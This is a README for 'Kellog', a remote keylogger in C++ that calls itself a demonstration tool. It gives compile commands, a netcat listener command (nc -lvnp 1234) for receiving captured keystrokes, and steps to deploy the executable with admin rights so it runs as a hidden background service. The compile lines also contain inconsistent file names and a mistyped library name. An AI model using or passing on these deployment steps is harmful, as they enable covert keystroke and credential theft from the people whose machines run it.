# Kellog
This is a remote keylogger coded in C++, used for demonstration purposes

# Please Note:
Kellog.exe needs to run with admin privileges

# TO COMPILE:

# LINUX
i686-w64-mingw32-g++ -static-libstdc++ -static-libgcc -o kellog.exe Kellog.c -lsw2_32 -DUNICODE

# WINDOWS
g++ -o kellog.exe kellog.cpp -lws2_32 -DUNICODE

# HOW TO USE
1) First modify your IP and Port in the Kellog.cpp file
2) Compile
3) start your reverse netcat listener with nc -lvnp 1234
4) deploy Kellog.exe and run it
  - it should automatically run as a background service called "kellog"
